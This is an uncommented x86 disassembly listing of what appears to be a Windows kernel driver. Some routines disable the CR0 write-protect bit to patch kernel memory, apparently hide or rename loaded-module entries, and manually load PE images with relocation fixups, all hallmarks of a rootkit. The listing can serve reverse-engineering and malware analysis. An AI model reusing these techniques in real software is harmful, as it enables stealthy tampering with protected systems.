   10cb9:	jne    0x10cc5
   10cbb:	inc    esi
   10cbc:	inc    esi
   10cbd:	cmp    WORD PTR [esi],0x0
   10cc1:	jne    0x10c48
   10cc3:	jmp    0x10d03
   10cc5:	movzx  eax,WORD PTR [edi+0x2]
   10cc9:	sub    esi,ebx
   10ccb:	sar    esi,1
   10ccd:	add    esi,esi
   10ccf:	cmp    si,ax
   10cd2:	mov    WORD PTR [edi],si
   10cd5:	ja     0x10cfc
   10cd7:	movzx  ecx,ax
   10cda:	movzx  eax,si
   10cdd:	shr    ecx,1
   10cdf:	dec    ecx
   10ce0:	add    eax,0x2
   10ce3:	cmp    eax,ecx
   10ce5:	jb     0x10ce9
   10ce7:	mov    eax,ecx
   10ce9:	push   eax
   10cea:	push   ebx
   10ceb:	push   DWORD PTR [edi+0x4]
   10cee:	call   0x1a1a4
   10cf3:	add    esp,0xc
   10cf6:	and    DWORD PTR [ebp-0x4],0x0
   10cfa:	jmp    0x10d03
   10cfc:	mov    DWORD PTR [ebp-0x4],0xc0000023
   10d03:	pop    ebx
   10d04:	pop    edi
   10d05:	mov    eax,DWORD PTR [ebp-0x4]
   10d08:	pop    esi
   10d09:	leave  
   10d0a:	ret    0xc
   10d0d:	int3   
   10d0e:	int3   
   10d0f:	int3   
   10d10:	int3   
   10d11:	int3   
   10d12:	push   0x30
   10d14:	push   0x1b388
   10d19:	call   0x1a1c8
   10d1e:	xor    ebx,ebx
   10d20:	mov    BYTE PTR [ebp-0x19],bl
   10d23:	mov    DWORD PTR [ebp-0x24],ebx
   10d26:	mov    DWORD PTR [ebp-0x20],ebx
   10d29:	cmp    DWORD PTR [ebp+0x8],ebx
   10d2c:	je     0x10e28
   10d32:	call   DWORD PTR ds:0x1b154
   10d38:	cmp    eax,ebx
   10d3a:	je     0x10e28
   10d40:	cmp    eax,0x4
   10d43:	je     0x10e28
   10d49:	lea    eax,[ebp-0x24]
   10d4c:	push   eax
   10d4d:	push   0x4
   10d4f:	lea    eax,[ebp-0x20]
   10d52:	push   eax
   10d53:	push   0x9
   10d55:	push   0xfffffffe
   10d57:	call   0x109c0
   10d5c:	cmp    DWORD PTR [ebp-0x20],ebx
   10d5f:	je     0x10e28
   10d65:	lea    eax,[ebp-0x24]
   10d68:	push   eax
   10d69:	push   0x18
   10d6b:	lea    eax,[ebp-0x40]
   10d6e:	push   eax
   10d6f:	push   ebx
   10d70:	push   0xffffffff
   10d72:	call   DWORD PTR ds:0x1b150
   10d78:	cmp    eax,ebx
   10d7a:	jne    0x10e28
   10d80:	mov    DWORD PTR [ebp-0x4],ebx
   10d83:	mov    esi,DWORD PTR [ebp-0x3c]
   10d86:	cmp    esi,ebx
   10d88:	je     0x10e1c
   10d8e:	push   0x1d8
   10d93:	push   esi
   10d94:	call   0x10a0a
   10d99:	test   al,al
   10d9b:	je     0x10e1c
   10d9d:	cmp    DWORD PTR [esi+0xc],ebx
   10da0:	je     0x10e1c
   10da2:	push   0x24
   10da4:	push   DWORD PTR [esi+0xc]
   10da7:	call   0x10a0a
   10dac:	test   al,al
   10dae:	je     0x10e1c
   10db0:	mov    edi,DWORD PTR [esi+0xc]
   10db3:	add    edi,0xc
   10db6:	je     0x10e1c
   10db8:	push   0x8
   10dba:	push   edi
   10dbb:	call   0x10a0a
   10dc0:	test   al,al
   10dc2:	je     0x10e1c
   10dc4:	mov    esi,DWORD PTR [edi]
   10dc6:	mov    DWORD PTR [ebp-0x28],esi
   10dc9:	cmp    esi,edi
   10dcb:	je     0x10e1c
   10dcd:	cmp    esi,ebx
   10dcf:	je     0x10e11
   10dd1:	push   0x48
   10dd3:	push   esi
   10dd4:	call   0x10a0a
   10dd9:	test   al,al
   10ddb:	je     0x10e11
   10ddd:	lea    eax,[esi+0x2c]
   10de0:	cmp    eax,ebx
   10de2:	je     0x10e11
   10de4:	mov    ecx,DWORD PTR [esi+0x18]
   10de7:	cmp    ecx,DWORD PTR [ebp-0x20]
   10dea:	jae    0x10e11
   10dec:	mov    edx,DWORD PTR [esi+0x20]
   10def:	add    edx,ecx
   10df1:	cmp    edx,DWORD PTR [ebp-0x20]
   10df4:	jbe    0x10e11
   10df6:	mov    BYTE PTR [ebp-0x19],0x1
   10dfa:	mov    eax,DWORD PTR [eax+0x4]
   10dfd:	mov    edx,DWORD PTR [ebp+0x8]
   10e00:	movzx  ecx,WORD PTR [eax]
   10e03:	mov    WORD PTR [edx],cx
   10e06:	inc    eax
   10e07:	inc    eax
   10e08:	inc    edx
   10e09:	inc    edx
   10e0a:	cmp    cx,bx
   10e0d:	jne    0x10e00
   10e0f:	jmp    0x10e1c
   10e11:	mov    esi,DWORD PTR [esi]
   10e13:	jmp    0x10dc6
   10e15:	xor    eax,eax
   10e17:	inc    eax
   10e18:	ret    
   10e19:	mov    esp,DWORD PTR [ebp-0x18]
   10e1c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   10e23:	mov    al,BYTE PTR [ebp-0x19]
   10e26:	jmp    0x10e2a
   10e28:	xor    al,al
   10e2a:	call   0x1a20d
   10e2f:	ret    0x4
   10e32:	int3   
   10e33:	int3   
   10e34:	int3   
   10e35:	int3   
   10e36:	int3   
   10e37:	int3   
   10e38:	mov    edi,edi
   10e3a:	push   ebp
   10e3b:	mov    ebp,esp
   10e3d:	sub    esp,0x14
   10e40:	push   ebx
   10e41:	xor    ebx,ebx
   10e43:	push   esi
   10e44:	push   edi
   10e45:	mov    DWORD PTR [ebp-0x4],ebx
   10e48:	mov    DWORD PTR [ebp-0x8],ebx
   10e4b:	mov    eax,cr0
   10e4e:	mov    DWORD PTR [ebp-0xc],eax
   10e51:	and    eax,0xfffeffff
   10e56:	mov    cr0,eax
   10e59:	mov    eax,ds:0x1b178
   10e5e:	lea    edi,[eax+0x1000]
   10e64:	cmp    eax,edi
   10e66:	mov    esi,eax
   10e68:	jae    0x10ec6
   10e6a:	lea    edx,[ebp-0x4]
   10e6d:	mov    ecx,esi
   10e6f:	call   0x10732
   10e74:	cmp    eax,ebx
   10e76:	je     0x10ec6
   10e78:	mov    ecx,DWORD PTR [ebp-0x4]
   10e7b:	cmp    BYTE PTR [ecx],0xe8
   10e7e:	jne    0x10e8f
   10e80:	mov    edx,DWORD PTR [ecx+0x1]
   10e83:	lea    edx,[edx+ecx*1+0x5]
   10e87:	cmp    edx,DWORD PTR ds:0x1b174
   10e8d:	je     0x10e97
   10e8f:	add    esi,eax
   10e91:	cmp    esi,edi
   10e93:	jb     0x10e6a
   10e95:	jmp    0x10ec6
   10e97:	mov    eax,DWORD PTR [ecx-0x4]
   10e9a:	mov    DWORD PTR [ebp-0x8],eax
   10e9d:	jmp    0x10ec6
   10e9f:	lea    edx,[ebp-0x4]
   10ea2:	mov    ecx,esi
   10ea4:	call   0x10732
   10ea9:	cmp    eax,ebx
   10eab:	je     0x10f8a
   10eb1:	mov    ecx,DWORD PTR [ebp-0x4]
   10eb4:	cmp    BYTE PTR [ecx],0x8b
   10eb7:	jne    0x10ec4
   10eb9:	mov    dl,BYTE PTR [ecx+0x1]
   10ebc:	and    dl,0xc7
   10ebf:	cmp    dl,0x5
   10ec2:	je     0x10ecf
   10ec4:	add    esi,eax
   10ec6:	cmp    esi,edi
   10ec8:	jb     0x10e9f
   10eca:	jmp    0x10f8a
   10ecf:	mov    edi,DWORD PTR [ecx+0x2]
   10ed2:	cmp    edi,ebx
   10ed4:	je     0x10f8a
   10eda:	cmp    DWORD PTR [ebp-0x8],ebx
   10edd:	je     0x10eea
   10edf:	push   0x1
   10ee1:	push   DWORD PTR [ebp-0x8]
   10ee4:	call   DWORD PTR ds:0x1b170
   10eea:	mov    esi,edi
   10eec:	cmp    DWORD PTR [esi+0x20],ebx
   10eef:	je     0x10f1e
   10ef1:	mov    eax,DWORD PTR [esi+0x28]
   10ef4:	cmp    eax,ebx
   10ef6:	je     0x10f1e
   10ef8:	push   0x5c
   10efa:	push   eax
   10efb:	call   DWORD PTR ds:0x1b16c
   10f01:	cmp    eax,ebx
   10f03:	pop    ecx
   10f04:	pop    ecx
   10f05:	je     0x10f0b
   10f07:	inc    eax
   10f08:	inc    eax
   10f09:	jmp    0x10f0e
   10f0b:	mov    eax,DWORD PTR [esi+0x28]
   10f0e:	push   DWORD PTR [ebp+0x8]
   10f11:	push   eax
   10f12:	call   DWORD PTR ds:0x1b168
   10f18:	test   eax,eax
   10f1a:	pop    ecx
   10f1b:	pop    ecx
   10f1c:	je     0x10f2a
   10f1e:	mov    esi,DWORD PTR [esi]
   10f20:	cmp    esi,ebx
   10f22:	je     0x10f7d
   10f24:	cmp    esi,edi
   10f26:	jne    0x10eec
   10f28:	jmp    0x10f7d
   10f2a:	movzx  eax,WORD PTR [esi+0x2e]
   10f2e:	push   eax
   10f2f:	lea    edi,[esi+0x2c]
   10f32:	mov    WORD PTR [edi],bx
   10f35:	push   0x0
   10f37:	push   DWORD PTR [esi+0x30]
   10f3a:	lea    ebx,[esi+0x24]
   10f3d:	and    WORD PTR [ebx],0x0
   10f41:	call   0x1a1b0
   10f46:	movzx  eax,WORD PTR [esi+0x26]
   10f4a:	push   eax
   10f4b:	push   0x0
   10f4d:	push   DWORD PTR [esi+0x28]
   10f50:	call   0x1a1b0
   10f55:	add    esp,0x18
   10f58:	push   0x1b740
   10f5d:	lea    eax,[ebp-0x14]
   10f60:	push   eax
   10f61:	call   DWORD PTR ds:0x1b164
   10f67:	mov    esi,DWORD PTR ds:0x1b160
   10f6d:	lea    eax,[ebp-0x14]
   10f70:	push   eax
   10f71:	push   edi
   10f72:	call   esi
   10f74:	lea    eax,[ebp-0x14]
   10f77:	push   eax
   10f78:	push   ebx
   10f79:	call   esi
   10f7b:	xor    ebx,ebx
   10f7d:	mov    ecx,DWORD PTR [ebp-0x8]
   10f80:	cmp    ecx,ebx
   10f82:	je     0x10f8a
   10f84:	call   DWORD PTR ds:0x1b15c
   10f8a:	mov    eax,DWORD PTR [ebp-0xc]
   10f8d:	mov    cr0,eax
   10f90:	pop    edi
   10f91:	pop    esi
   10f92:	pop    ebx
   10f93:	leave  
   10f94:	ret    0x4
   10f97:	int3   
   10f98:	int3   
   10f99:	int3   
   10f9a:	int3   
   10f9b:	int3   
   10f9c:	mov    edi,edi
   10f9e:	push   ebp
   10f9f:	mov    ebp,esp
   10fa1:	mov    eax,DWORD PTR [ebp+0x8]
   10fa4:	test   eax,eax
   10fa6:	jne    0x10fac
   10fa8:	xor    eax,eax
   10faa:	jmp    0x10fc7
   10fac:	cmp    WORD PTR [eax],0x5a4d
   10fb1:	jne    0x10fa8
   10fb3:	mov    ecx,DWORD PTR [eax+0x3c]
   10fb6:	add    ecx,eax
   10fb8:	mov    eax,DWORD PTR [ecx]
   10fba:	sub    eax,0x4550
   10fbf:	neg    eax
   10fc1:	sbb    eax,eax
   10fc3:	not    eax
   10fc5:	and    eax,ecx
   10fc7:	pop    ebp
   10fc8:	ret    0x4
   10fcb:	int3   
   10fcc:	int3   
   10fcd:	int3   
   10fce:	int3   
   10fcf:	int3   
   10fd0:	mov    edi,edi
   10fd2:	push   ebp
   10fd3:	mov    ebp,esp
   10fd5:	mov    edx,DWORD PTR [ebp+0x8]
   10fd8:	push   esi
   10fd9:	mov    esi,DWORD PTR [ebp+0xc]
   10fdc:	push   edi
   10fdd:	jmp    0x10fe5
   10fdf:	test   cl,cl
   10fe1:	je     0x10ff1
   10fe3:	inc    edx
   10fe4:	inc    esi
   10fe5:	mov    cl,BYTE PTR [edx]
   10fe7:	movzx  edi,BYTE PTR [esi]
   10fea:	movzx  eax,cl
   10fed:	sub    eax,edi
   10fef:	je     0x10fdf
   10ff1:	pop    edi
   10ff2:	pop    esi
   10ff3:	pop    ebp
   10ff4:	ret    0x8
   10ff7:	int3   
   10ff8:	int3   
   10ff9:	int3   
   10ffa:	int3   
   10ffb:	int3   
   10ffc:	mov    edi,edi
   10ffe:	push   ebp
   10fff:	mov    ebp,esp
   11001:	mov    edx,DWORD PTR [ebp+0x8]
   11004:	sub    esp,0xc
   11007:	test   edx,edx
   11009:	push   ebx
   1100a:	push   esi
   1100b:	push   edi
   1100c:	je     0x1109d
   11012:	cmp    DWORD PTR [ebp+0xc],0x0
   11016:	je     0x1109d
   1101c:	push   edx
   1101d:	call   0x10f9c
   11022:	test   eax,eax
   11024:	je     0x1109d
   11026:	mov    eax,DWORD PTR [eax+0x78]
   11029:	add    eax,edx
   1102b:	je     0x1109d
   1102d:	mov    ecx,DWORD PTR [eax+0x20]
   11030:	test   ecx,ecx
   11032:	je     0x1109d
   11034:	mov    ebx,DWORD PTR [eax+0x1c]
   11037:	mov    edi,DWORD PTR [eax+0x18]
   1103a:	and    DWORD PTR [ebp-0x4],0x0
   1103e:	add    ecx,edx
   11040:	mov    DWORD PTR [ebp-0x8],ecx
   11043:	mov    ecx,DWORD PTR [eax+0x24]
   11046:	add    ecx,edx
   11048:	add    ebx,edx
   1104a:	mov    DWORD PTR [ebp-0xc],ecx
   1104d:	dec    edi
   1104e:	jmp    0x11053
   11050:	mov    edx,DWORD PTR [ebp+0x8]
   11053:	mov    eax,DWORD PTR [ebp-0x4]
   11056:	push   DWORD PTR [ebp+0xc]
   11059:	lea    esi,[edi+eax*1]
   1105c:	mov    eax,DWORD PTR [ebp-0x8]
   1105f:	shr    esi,1
   11061:	mov    eax,DWORD PTR [eax+esi*4]
   11064:	add    eax,edx
   11066:	push   eax
   11067:	call   0x10fd0
   1106c:	test   eax,eax
   1106e:	jne    0x11086
   11070:	mov    eax,DWORD PTR [ebp-0xc]
   11073:	movzx  eax,WORD PTR [eax+esi*2]
   11077:	lea    ecx,[ebx+eax*4]
   1107a:	mov    eax,DWORD PTR [ecx]
   1107c:	add    eax,DWORD PTR [ebp+0x8]
   1107f:	cmp    DWORD PTR [ecx],0x0
   11082:	jne    0x1109f
   11084:	jmp    0x11098
   11086:	cmp    DWORD PTR [ebp-0x4],edi
   11089:	je     0x1109d
   1108b:	test   eax,eax
   1108d:	jle    0x11094
   1108f:	lea    edi,[esi-0x1]
   11092:	jmp    0x11098
   11094:	inc    esi
   11095:	mov    DWORD PTR [ebp-0x4],esi
   11098:	cmp    DWORD PTR [ebp-0x4],edi
   1109b:	jbe    0x11050
   1109d:	xor    eax,eax
   1109f:	pop    edi
   110a0:	pop    esi
   110a1:	pop    ebx
   110a2:	leave  
   110a3:	ret    0x8
   110a6:	int3   
   110a7:	int3   
   110a8:	int3   
   110a9:	int3   
   110aa:	int3   
   110ab:	int3   
   110ac:	mov    edi,edi
   110ae:	push   ebp
   110af:	mov    ebp,esp
   110b1:	push   esi
   110b2:	mov    esi,DWORD PTR [ebp+0x8]
   110b5:	cmp    WORD PTR [esi],0x5a4d
   110ba:	je     0x110c3
   110bc:	mov    eax,0xc000000d
   110c1:	jmp    0x110fe
   110c3:	mov    eax,DWORD PTR [esi+0x3c]
   110c6:	add    eax,esi
   110c8:	cmp    WORD PTR [eax+0x14],0xe0
   110ce:	jne    0x110bc
   110d0:	push   edi
   110d1:	mov    edi,DWORD PTR [ebp+0xc]
   110d4:	push   0x10
   110d6:	pop    ecx
   110d7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   110d9:	mov    edi,DWORD PTR [ebp+0x10]
   110dc:	push   0x6
   110de:	pop    ecx
   110df:	lea    edx,[eax+0x18]
   110e2:	mov    esi,eax
   110e4:	mov    eax,DWORD PTR [ebp+0x18]
   110e7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   110e9:	mov    edi,DWORD PTR [ebp+0x14]
   110ec:	push   0x38
   110ee:	pop    ecx
   110ef:	mov    esi,edx
   110f1:	add    edx,0xe0
   110f7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   110f9:	mov    DWORD PTR [eax],edx
   110fb:	xor    eax,eax
   110fd:	pop    edi
   110fe:	pop    esi
   110ff:	pop    ebp
   11100:	ret    0x14
   11103:	int3   
   11104:	int3   
   11105:	int3   
   11106:	int3   
   11107:	int3   
   11108:	mov    edi,edi
   1110a:	push   ebp
   1110b:	mov    ebp,esp
   1110d:	mov    eax,DWORD PTR [ebp+0x10]
   11110:	mov    ecx,DWORD PTR [eax+0x3c]
   11113:	push   esi
   11114:	mov    esi,DWORD PTR [eax+0x20]
   11117:	xor    edx,edx
   11119:	mov    eax,ecx
   1111b:	div    esi
   1111d:	test   edx,edx
   1111f:	je     0x11127
   11121:	lea    ecx,[eax+0x1]
   11124:	imul   ecx,esi
   11127:	mov    eax,DWORD PTR [ebp+0xc]
   1112a:	movzx  eax,WORD PTR [eax+0x6]
   1112e:	test   eax,eax
   11130:	jbe    0x11161
   11132:	push   ebx
   11133:	mov    ebx,DWORD PTR [ebp+0x14]
   11136:	push   edi
   11137:	add    ebx,0x8
   1113a:	mov    DWORD PTR [ebp+0x10],eax
   1113d:	mov    edi,DWORD PTR [ebx]
   1113f:	test   edi,edi
   11141:	je     0x11157
   11143:	xor    edx,edx
   11145:	mov    eax,edi
   11147:	div    esi
   11149:	test   edx,edx
   1114b:	jne    0x11151
   1114d:	add    ecx,edi
   1114f:	jmp    0x11157
   11151:	inc    eax
   11152:	imul   eax,esi
   11155:	add    ecx,eax
   11157:	add    ebx,0x28
   1115a:	dec    DWORD PTR [ebp+0x10]
   1115d:	jne    0x1113d
   1115f:	pop    edi
   11160:	pop    ebx
   11161:	mov    eax,ecx
   11163:	pop    esi
   11164:	pop    ebp
   11165:	ret    0x10
   11168:	int3   
   11169:	int3   
   1116a:	int3   
   1116b:	int3   
   1116c:	int3   
   1116d:	int3   
   1116e:	mov    edi,edi
   11170:	push   ebp
   11171:	mov    ebp,esp
   11173:	mov    eax,DWORD PTR [ebp+0x8]
   11176:	xor    edx,edx
   11178:	div    DWORD PTR [ebp+0xc]
   1117b:	test   edx,edx
   1117d:	jne    0x11184
   1117f:	mov    eax,DWORD PTR [ebp+0x8]
   11182:	jmp    0x11189
   11184:	inc    eax
   11185:	imul   eax,DWORD PTR [ebp+0xc]
   11189:	pop    ebp
   1118a:	ret    0x8
   1118d:	int3   
   1118e:	int3   
   1118f:	int3   
   11190:	int3   
   11191:	int3   
   11192:	mov    edi,edi
   11194:	push   ebp
   11195:	mov    ebp,esp
   11197:	push   edi
   11198:	xor    edi,edi
   1119a:	cmp    DWORD PTR [ebp+0x8],edi
   1119d:	je     0x11226
   111a3:	cmp    DWORD PTR [ebp+0x1c],edi
   111a6:	je     0x11226
   111a8:	push   ebx
   111a9:	push   esi
   111aa:	mov    esi,DWORD PTR [ebp+0x14]
   111ad:	push   DWORD PTR [esi+0x3c]
   111b0:	push   DWORD PTR [ebp+0x8]
   111b3:	push   DWORD PTR [ebp+0x1c]
   111b6:	call   0x1a1a4
   111bb:	add    esp,0xc
   111be:	push   DWORD PTR [esi+0x20]
   111c1:	push   DWORD PTR [esi+0x3c]
   111c4:	call   0x1116e
   111c9:	mov    ebx,eax
   111cb:	add    ebx,DWORD PTR [ebp+0x1c]
   111ce:	mov    eax,DWORD PTR [ebp+0x10]
   111d1:	cmp    WORD PTR [eax+0x6],di
   111d5:	mov    DWORD PTR [ebp+0x1c],edi
   111d8:	jbe    0x11220
   111da:	mov    edi,DWORD PTR [ebp+0x18]
   111dd:	add    edi,0x8
   111e0:	mov    eax,DWORD PTR [edi+0x8]
   111e3:	test   eax,eax
   111e5:	jbe    0x1120e
   111e7:	mov    ecx,eax
   111e9:	mov    eax,DWORD PTR [edi]
   111eb:	cmp    ecx,eax
   111ed:	jbe    0x111f1
   111ef:	mov    ecx,eax
   111f1:	mov    eax,DWORD PTR [edi+0xc]
   111f4:	add    eax,DWORD PTR [ebp+0x8]
   111f7:	push   ecx
   111f8:	push   eax
   111f9:	push   ebx
   111fa:	call   0x1a1a4
   111ff:	add    esp,0xc
   11202:	push   DWORD PTR [esi+0x20]
   11205:	push   DWORD PTR [edi]
   11207:	call   0x1116e
   1120c:	add    ebx,eax
   1120e:	mov    eax,DWORD PTR [ebp+0x10]
   11211:	movzx  eax,WORD PTR [eax+0x6]
   11215:	inc    DWORD PTR [ebp+0x1c]
   11218:	add    edi,0x28
   1121b:	cmp    DWORD PTR [ebp+0x1c],eax
   1121e:	jb     0x111e0
   11220:	pop    esi
   11221:	xor    eax,eax
   11223:	pop    ebx
   11224:	jmp    0x1122b
   11226:	mov    eax,0xc000000d
   1122b:	pop    edi
   1122c:	pop    ebp
   1122d:	ret    0x18
   11230:	int3   
   11231:	int3   
   11232:	int3   
   11233:	int3   
   11234:	int3   
   11235:	int3   
   11236:	mov    edi,edi
   11238:	push   ebp
   11239:	mov    ebp,esp
   1123b:	push   ebx
   1123c:	mov    ebx,DWORD PTR [ebp+0x10]
   1123f:	test   ebx,ebx
   11241:	je     0x1127d
   11243:	push   edi
   11244:	mov    edi,DWORD PTR [ebp+0x14]
   11247:	test   edi,edi
   11249:	je     0x1127c
   1124b:	cmp    DWORD PTR [ebp+0x8],0x0
   1124f:	push   esi
   11250:	mov    esi,DWORD PTR [ebp+0xc]
   11253:	je     0x11260
   11255:	push   esi
   11256:	call   DWORD PTR ds:0x1b130
   1125c:	test   al,al
   1125e:	je     0x1127b
   11260:	mov    eax,DWORD PTR [esi+0x3c]
   11263:	add    eax,esi
   11265:	mov    ecx,DWORD PTR [eax+0x1c]
   11268:	mov    DWORD PTR [edi],ecx
   1126a:	mov    ecx,DWORD PTR [eax+0x2c]
   1126d:	add    ecx,esi
   1126f:	mov    DWORD PTR [ebx],ecx
   11271:	mov    eax,DWORD PTR [eax+0x28]
   11274:	mov    ecx,DWORD PTR [ebp+0x18]
   11277:	add    eax,esi
   11279:	mov    DWORD PTR [ecx],eax
   1127b:	pop    esi
   1127c:	pop    edi
   1127d:	pop    ebx
   1127e:	pop    ebp
   1127f:	ret    0x14
   11282:	int3   
   11283:	int3   
   11284:	int3   
   11285:	int3   
   11286:	int3   
   11287:	int3   
   11288:	mov    edi,edi
   1128a:	push   ebp
   1128b:	mov    ebp,esp
   1128d:	sub    esp,0x14
   11290:	push   edi
   11291:	mov    edi,DWORD PTR [ebp+0x8]
   11294:	test   edi,edi
   11296:	je     0x11393
   1129c:	cmp    DWORD PTR [ebp+0xc],0x0
   112a0:	je     0x11393
   112a6:	push   0x1a53a
   112ab:	push   edi
   112ac:	call   0x10ffc
   112b1:	test   eax,eax
   112b3:	mov    DWORD PTR [ebp-0x8],eax
   112b6:	je     0x112bb
   112b8:	sub    DWORD PTR [ebp-0x8],edi
   112bb:	mov    eax,DWORD PTR [edi+0x3c]
   112be:	add    eax,edi
   112c0:	push   ebx
   112c1:	push   esi
   112c2:	mov    esi,DWORD PTR [eax+0xa0]
   112c8:	mov    eax,DWORD PTR [eax+0x34]
   112cb:	add    esi,edi
   112cd:	and    DWORD PTR [ebp-0x14],0x0
   112d1:	mov    DWORD PTR [ebp-0xc],eax
   112d4:	jmp    0x11350
   112d6:	push   0x8
   112d8:	pop    eax
   112d9:	cmp    ebx,eax
   112db:	mov    DWORD PTR [ebp-0x4],eax
   112de:	jbe    0x1134e
   112e0:	mov    eax,DWORD PTR [ebp-0x4]
   112e3:	add    eax,esi
   112e5:	push   eax
   112e6:	call   DWORD PTR ds:0x1b130
   112ec:	test   al,al
   112ee:	je     0x11360
   112f0:	mov    eax,DWORD PTR [ebp-0x4]
   112f3:	add    eax,esi
   112f5:	movzx  eax,WORD PTR [eax]
   112f8:	mov    ecx,eax
   112fa:	and    cx,0xf000
   112ff:	cmp    cx,0x3000
   11304:	jne    0x11345
   11306:	and    eax,0xfff
   1130b:	add    eax,DWORD PTR [ebp-0x10]
   1130e:	add    eax,edi
   11310:	mov    edi,eax
   11312:	push   edi
   11313:	call   DWORD PTR ds:0x1b130
   11319:	test   al,al
   1131b:	je     0x11360
   1131d:	mov    ecx,DWORD PTR [edi]
   1131f:	sub    ecx,DWORD PTR [ebp-0xc]
   11322:	cmp    ecx,DWORD PTR [ebp-0x8]
   11325:	jne    0x1133b
   11327:	cmp    WORD PTR [edi-0x2],0x5c7
   1132d:	jne    0x1133b
   1132f:	mov    eax,DWORD PTR [edi+0x4]
   11332:	sub    eax,DWORD PTR [ebp-0xc]
   11335:	add    eax,DWORD PTR [ebp+0x8]
   11338:	mov    DWORD PTR [ebp-0x14],eax
   1133b:	mov    eax,DWORD PTR [ebp+0xc]
   1133e:	add    ecx,eax
   11340:	mov    DWORD PTR [edi],ecx
   11342:	mov    edi,DWORD PTR [ebp+0x8]
   11345:	add    DWORD PTR [ebp-0x4],0x2
   11349:	cmp    DWORD PTR [ebp-0x4],ebx
   1134c:	jb     0x112e0
   1134e:	add    esi,ebx
   11350:	mov    ebx,DWORD PTR [esi+0x4]
   11353:	test   ebx,ebx
   11355:	mov    eax,DWORD PTR [esi]
   11357:	mov    DWORD PTR [ebp-0x10],eax
   1135a:	jne    0x112d6
   11360:	mov    ecx,DWORD PTR [ebp+0x10]
   11363:	xor    eax,eax
   11365:	cmp    ecx,eax
   11367:	je     0x11391
   11369:	mov    edx,DWORD PTR ds:0x1b17c
   1136f:	cmp    DWORD PTR [edx+0x8],eax
   11372:	jbe    0x1138b
   11374:	mov    edx,DWORD PTR [ebp-0x14]
   11377:	mov    esi,DWORD PTR [edx]
   11379:	mov    DWORD PTR [ecx+eax*4],esi
   1137c:	mov    esi,DWORD PTR ds:0x1b17c
   11382:	add    edx,0x4
   11385:	inc    eax
   11386:	cmp    eax,DWORD PTR [esi+0x8]
   11389:	jb     0x11377
   1138b:	mov    DWORD PTR [ecx+0x640],eax
   11391:	pop    esi
   11392:	pop    ebx
   11393:	pop    edi
   11394:	leave  
   11395:	ret    0xc
   11398:	int3   
   11399:	int3   
   1139a:	int3   
   1139b:	int3   
   1139c:	int3   
   1139d:	int3   
   1139e:	mov    edi,edi
   113a0:	push   ebp
   113a1:	mov    ebp,esp
   113a3:	sub    esp,0x198
   113a9:	mov    eax,ds:0x1bb6c
   113ae:	xor    eax,ebp
   113b0:	mov    DWORD PTR [ebp-0x4],eax
   113b3:	mov    eax,DWORD PTR [ebp+0xc]
   113b6:	push   esi
   113b7:	mov    esi,DWORD PTR [ebp+0x8]
   113ba:	push   edi
   113bb:	xor    edi,edi
   113bd:	cmp    esi,edi
   113bf:	mov    DWORD PTR [ebp-0x58],eax
   113c2:	mov    eax,DWORD PTR [ebp+0x10]
   113c5:	mov    DWORD PTR [ebp-0x60],eax
   113c8:	mov    DWORD PTR [ebp-0x48],edi
   113cb:	mov    DWORD PTR [ebp-0x54],0xc000007b
   113d2:	je     0x1153c
   113d8:	push   ebx
   113d9:	push   0x1a554
   113de:	lea    eax,[ebp-0x88]
   113e4:	push   eax
   113e5:	mov    DWORD PTR [esi],edi
   113e7:	call   DWORD PTR ds:0x1b164
   113ed:	push   0x18
   113ef:	pop    ebx
   113f0:	push   0x20
   113f2:	lea    eax,[ebp-0x88]
   113f8:	mov    DWORD PTR [ebp-0x78],eax
   113fb:	push   0x7
   113fd:	lea    eax,[ebp-0x68]
   11400:	push   eax
   11401:	lea    eax,[ebp-0x80]
   11404:	push   eax
   11405:	push   0x100001
   1140a:	lea    eax,[ebp-0x48]
   1140d:	push   eax
   1140e:	mov    DWORD PTR [ebp-0x80],ebx
   11411:	mov    DWORD PTR [ebp-0x7c],edi
   11414:	mov    DWORD PTR [ebp-0x74],0x240
   1141b:	mov    DWORD PTR [ebp-0x70],edi
   1141e:	mov    DWORD PTR [ebp-0x6c],edi
   11421:	call   DWORD PTR ds:0x1b18c
   11427:	test   eax,eax
   11429:	jne    0x1153b
   1142f:	push   0x5
   11431:	push   ebx
   11432:	lea    eax,[ebp-0xa0]
   11438:	push   eax
   11439:	lea    eax,[ebp-0x68]
   1143c:	push   eax
   1143d:	push   DWORD PTR [ebp-0x48]
   11440:	call   DWORD PTR ds:0x1b188
   11446:	test   eax,eax
   11448:	jne    0x11532
   1144e:	push   DWORD PTR [ebp-0x98]
   11454:	mov    ebx,DWORD PTR ds:0x1b124
   1145a:	push   edi
   1145b:	call   ebx
   1145d:	cmp    eax,edi
   1145f:	mov    DWORD PTR [ebp-0x4c],eax
   11462:	je     0x11532
   11468:	push   DWORD PTR [ebp-0x98]
   1146e:	push   edi
   1146f:	push   eax
   11470:	call   0x1a1b0
   11475:	add    esp,0xc
   11478:	push   edi
   11479:	push   edi
   1147a:	push   DWORD PTR [ebp-0x98]
   11480:	lea    eax,[ebp-0x68]
   11483:	push   DWORD PTR [ebp-0x4c]
   11486:	push   eax
   11487:	push   edi
   11488:	push   edi
   11489:	push   edi
   1148a:	push   DWORD PTR [ebp-0x48]
   1148d:	call   DWORD PTR ds:0x1b184
   11493:	test   eax,eax
   11495:	jne    0x11528
   1149b:	lea    eax,[ebp-0x50]
   1149e:	push   eax
   1149f:	lea    eax,[ebp-0x198]
   114a5:	push   eax
   114a6:	lea    eax,[ebp-0xb8]
   114ac:	push   eax
   114ad:	lea    eax,[ebp-0x44]
   114b0:	push   eax
   114b1:	push   DWORD PTR [ebp-0x4c]
   114b4:	call   0x110ac
   114b9:	test   eax,eax
   114bb:	jne    0x11528
   114bd:	push   DWORD PTR [ebp-0x50]
   114c0:	lea    eax,[ebp-0x198]
   114c6:	push   eax
   114c7:	lea    eax,[ebp-0xb8]
   114cd:	push   eax
   114ce:	lea    eax,[ebp-0x44]
   114d1:	push   eax
   114d2:	call   0x11108
   114d7:	cmp    eax,edi
   114d9:	mov    DWORD PTR [ebp-0x5c],eax
   114dc:	je     0x11528
   114de:	push   eax
   114df:	push   edi
   114e0:	call   ebx
   114e2:	cmp    eax,edi
   114e4:	mov    DWORD PTR [esi],eax
   114e6:	je     0x11528
   114e8:	push   DWORD PTR [ebp-0x5c]
   114eb:	push   edi
   114ec:	push   eax
   114ed:	call   0x1a1b0
   114f2:	add    esp,0xc
